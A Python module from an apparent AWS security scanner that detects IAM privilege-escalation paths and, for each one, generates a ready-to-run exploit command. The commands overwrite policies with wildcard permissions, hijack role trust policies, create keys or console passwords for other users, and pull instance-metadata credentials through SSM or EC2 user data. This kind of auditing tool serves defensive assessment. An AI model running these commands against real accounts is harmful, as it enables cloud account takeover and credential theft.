"""
IAM privilege escalation path detection.
Ref: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/

NOTE: Resource constraints and Conditions are ignored — over-reports false positives.
Every path is "caller *could* do this if no resource scope" — expected for recon.
"""

import fnmatch


ADMIN_POLICY_ARN = 'arn:aws:iam::aws:policy/AdministratorAccess'
POWER_USER_POLICY_ARN = 'arn:aws:iam::aws:policy/PowerUserAccess'
HIGH_PRIV_POLICY_ARNS = {ADMIN_POLICY_ARN, POWER_USER_POLICY_ARN}


def _has(perms: set[str], action: str) -> bool:
    a = action.lower()
    for p in perms:
        if p == '*' or fnmatch.fnmatch(a, p):
            return True
    return False


def _has_all(perms: set[str], actions: list[str]) -> bool:
    return all(_has(perms, a) for a in actions)


def check_privesc(permissions: set[str], scan_data: dict) -> list[dict]:
    identity = scan_data.get('identity', {})
    account = identity.get('account_id', 'ACCOUNT')
    caller_arn = identity.get('arn', '')
    caller_type = identity.get('type', '')
    caller_name = caller_arn.split('/')[-1]

    if caller_type == 'root':
        return []  # root has all permissions; no escalation to model

    paths = []

    def _add(technique, sev, description, exploit_cmd, permissions_needed):
        paths.append({
            'severity': sev,
            'resource': caller_arn,
            'finding': f'privesc: {description}',
            'technique': technique,
            'exploit_cmd': exploit_cmd,
            'permissions_needed': permissions_needed,
        })

    assumable = _assumable_roles(scan_data, caller_arn)
    high_priv_roles = _high_priv_roles(scan_data)

    # --- single-permission paths ---

    if _has(permissions, 'iam:CreatePolicyVersion'):
        customer_policies = [
            p for p in scan_data.get('iam', {}).get('policies', [])
            if p.get('Arn', '').startswith(f'arn:aws:iam::{account}:policy/')
        ]
        if customer_policies:
            arn = customer_policies[0]['Arn']
            _add(
                'CreatePolicyVersion', 'CRIT',
                f'overwrite {customer_policies[0]["PolicyName"]} with wildcard allow',
                f'aws iam create-policy-version --policy-arn {arn} '
                f"--policy-document '{{\"Version\":\"2012-10-17\",\"Statement\":[{{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}}]}}' "
                f'--set-as-default',
                ['iam:CreatePolicyVersion'],
            )

    if caller_type == 'iam_user' and _has(permissions, 'iam:AttachUserPolicy'):
        _add(
            'AttachUserPolicy', 'CRIT',
            'attach AdministratorAccess to self',
            f'aws iam attach-user-policy --user-name {caller_name} --policy-arn {ADMIN_POLICY_ARN}',
            ['iam:AttachUserPolicy'],
        )

    if _has(permissions, 'iam:AttachRolePolicy') and assumable:
        role_name = assumable[0].split('/')[-1]
        _add(
            'AttachRolePolicy', 'CRIT',
            f'attach AdministratorAccess to assumable role {role_name}, then assume it',
            f'aws iam attach-role-policy --role-name {role_name} --policy-arn {ADMIN_POLICY_ARN} && '
            f'aws sts assume-role --role-arn {assumable[0]} --role-session-name escalate',
            ['iam:AttachRolePolicy', 'sts:AssumeRole'],
        )

    if caller_type == 'iam_user' and _has(permissions, 'iam:PutUserPolicy'):
        _add(
            'PutUserPolicy', 'CRIT',
            'write inline wildcard policy to self',
            f'aws iam put-user-policy --user-name {caller_name} --policy-name pwn '
            f"--policy-document '{{\"Version\":\"2012-10-17\",\"Statement\":[{{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}}]}}'",
            ['iam:PutUserPolicy'],
        )

    if _has(permissions, 'iam:PutRolePolicy') and assumable:
        role_name = assumable[0].split('/')[-1]
        _add(
            'PutRolePolicy', 'CRIT',
            f'write inline wildcard policy to assumable role {role_name}',
            f'aws iam put-role-policy --role-name {role_name} --policy-name pwn '
            f"--policy-document '{{\"Version\":\"2012-10-17\",\"Statement\":[{{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}}]}}' && "
            f'aws sts assume-role --role-arn {assumable[0]} --role-session-name escalate',
            ['iam:PutRolePolicy', 'sts:AssumeRole'],
        )

    if _has(permissions, 'iam:UpdateAssumeRolePolicy') and high_priv_roles:
        # target a high-priv role not already assumable
        not_assumable_hp = [r for r in high_priv_roles if r not in assumable]
        target = (not_assumable_hp or high_priv_roles)[0]
        role_name = target.split('/')[-1]
        _add(
            'UpdateAssumeRolePolicy', 'CRIT',
            f'modify trust policy of high-priv role {role_name} to allow caller, then assume it',
            f"aws iam update-assume-role-policy --role-name {role_name} "
            f"--policy-document '{{\"Version\":\"2012-10-17\",\"Statement\":[{{\"Effect\":\"Allow\",\"Action\":\"sts:AssumeRole\",\"Principal\":{{\"AWS\":\"{caller_arn}\"}}}}]}}' && "
            f'aws sts assume-role --role-arn {target} --role-session-name escalate',
            ['iam:UpdateAssumeRolePolicy', 'sts:AssumeRole'],
        )

    if caller_type == 'iam_user' and _has(permissions, 'iam:AddUserToGroup'):
        _add(
            'AddUserToGroup', 'HIGH',
            'add self to any group — including admin groups',
            f'aws iam add-user-to-group --user-name {caller_name} --group-name <admin-group-name>',
            ['iam:AddUserToGroup'],
        )

    if _has(permissions, 'iam:CreateAccessKey'):
        other_users = [
            u for u in scan_data.get('iam', {}).get('users', [])
            if u.get('Arn') != caller_arn
        ]
        if other_users:
            target_name = other_users[0]['UserName']
            _add(
                'CreateAccessKey', 'HIGH',
                f'create access key for existing user {target_name}',
                f'aws iam create-access-key --user-name {target_name}',
                ['iam:CreateAccessKey'],
            )

    if _has(permissions, 'iam:CreateLoginProfile') or _has(permissions, 'iam:UpdateLoginProfile'):
        other_users = [
            u for u in scan_data.get('iam', {}).get('users', [])
            if u.get('Arn') != caller_arn
        ]
        if other_users:
            target_name = other_users[0]['UserName']
            action = 'create-login-profile' if _has(permissions, 'iam:CreateLoginProfile') else 'update-login-profile'
            _add(
                'LoginProfile', 'HIGH',
                f'set console password for user {target_name} and log in as them',
                f'aws iam {action} --user-name {target_name} --password Cl0udy!1337 --no-password-reset-required',
                [f'iam:{action.replace("-", "").title()}'],
            )

    # --- multi-permission paths (PassRole chains) ---

    if _has_all(permissions, ['iam:PassRole', 'ec2:RunInstances']):
        _add(
            'PassRole+RunInstances', 'CRIT',
            'launch EC2 with admin instance profile — instance metadata gives you the credentials',
            'aws ec2 run-instances --image-id <ami> --instance-type t2.micro '
            '--iam-instance-profile Name=<admin-profile> '
            "--user-data '#!/bin/bash\ncurl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ > /tmp/creds.txt'",
            ['iam:PassRole', 'ec2:RunInstances'],
        )

    if _has_all(permissions, ['iam:PassRole', 'lambda:CreateFunction', 'lambda:InvokeFunction']):
        _add(
            'PassRole+Lambda', 'CRIT',
            'create Lambda with admin execution role, invoke it to run arbitrary AWS API calls',
            'aws lambda create-function --function-name escalate --runtime python3.11 '
            '--role <admin-role-arn> --handler index.handler --zip-file fileb://payload.zip && '
            'aws lambda invoke --function-name escalate /dev/stdout',
            ['iam:PassRole', 'lambda:CreateFunction', 'lambda:InvokeFunction'],
        )

    if _has_all(permissions, ['iam:PassRole', 'cloudformation:CreateStack']):
        _add(
            'PassRole+CloudFormation', 'CRIT',
            'create CloudFormation stack with admin role — stack actions run as admin',
            'aws cloudformation create-stack --stack-name escalate '
            '--template-body file://template.json --role-arn <admin-role-arn> --capabilities CAPABILITY_IAM',
            ['iam:PassRole', 'cloudformation:CreateStack'],
        )

    if _has_all(permissions, ['iam:PassRole', 'glue:CreateJob', 'glue:StartJobRun']):
        _add(
            'PassRole+Glue', 'CRIT',
            'create Glue ETL job with admin execution role',
            'aws glue create-job --name escalate --role <admin-role-arn> '
            '--command Name=glueetl,ScriptLocation=s3://bucket/script.py && '
            'aws glue start-job-run --job-name escalate',
            ['iam:PassRole', 'glue:CreateJob', 'glue:StartJobRun'],
        )

    # --- SSM SendCommand → lateral move via EC2 instance profile ---
    if _has(permissions, 'ssm:SendCommand'):
        for region_data in scan_data.get('ec2', {}).values():
            if not isinstance(region_data, dict) or 'error' in region_data:
                continue
            for inst in region_data.get('instances', []):
                if inst.get('iam_profile') and inst.get('state') == 'running':
                    inst_id = inst['id']
                    role_name = inst['iam_profile'].split('/')[-1]
                    _add(
                        'SSM:SendCommand', 'CRIT',
                        f'send shell command to {inst_id} (role: {role_name}) — grab IMDS creds',
                        f'aws ssm send-command --instance-ids {inst_id} '
                        f'--document-name AWS-RunShellScript '
                        f"--parameters 'commands=[\"curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}\"]' "
                        f'--output text --query "Command.CommandId"',
                        ['ssm:SendCommand'],
                    )
                    break  # one example per region is enough
            else:
                continue
            break

    return paths


def paths_from_graph(graph_paths: list[list[str]], graph) -> list[dict]:
    """Convert nx path lists to finding dicts for terminal + Claude output."""
    import networkx as nx
    findings = []
    for path in graph_paths:
        hops = []
        for i in range(len(path) - 1):
            edge = graph.edges[path[i], path[i + 1]]
            rel = edge.get('relationship', '')
            hops.append(f"{path[i].split('/')[-1]} --[{rel}]--> {path[i+1].split('/')[-1]}")
        findings.append({
            'severity': 'CRIT',
            'resource': path[0],
            'finding': f'privesc: multi-hop path to {path[-1].split("/")[-1]}',
            'technique': 'MultiHop',
            'exploit_cmd': ' && '.join(hops),
            'permissions_needed': ['see path'],
            'path': path,
        })
    return findings


def _assumable_roles(scan_data: dict, caller_arn: str) -> list[str]:
    """ARNs of roles whose trust policy permits the caller."""
    out = []
    for role in scan_data.get('iam', {}).get('roles', []):
        trust = role.get('AssumeRolePolicyDocument', {})
        for stmt in trust.get('Statement', []):
            if stmt.get('Effect') != 'Allow':
                continue
            principal = stmt.get('Principal', {})
            arns = [principal] if isinstance(principal, str) else (
                ([principal['AWS']] if isinstance(principal.get('AWS'), str) else principal.get('AWS', []))
            )
            if caller_arn in arns or '*' in arns:
                out.append(role['Arn'])
                break
    return out


def _high_priv_roles(scan_data: dict) -> list[str]:
    """Roles with AdministratorAccess or PowerUserAccess attached (by ARN, not name heuristic)."""
    out = []
    for role in scan_data.get('iam', {}).get('roles', []):
        attached = {p.get('PolicyArn') for p in role.get('attached_policies', [])}
        if attached & HIGH_PRIV_POLICY_ARNS:
            out.append(role['Arn'])
    return out
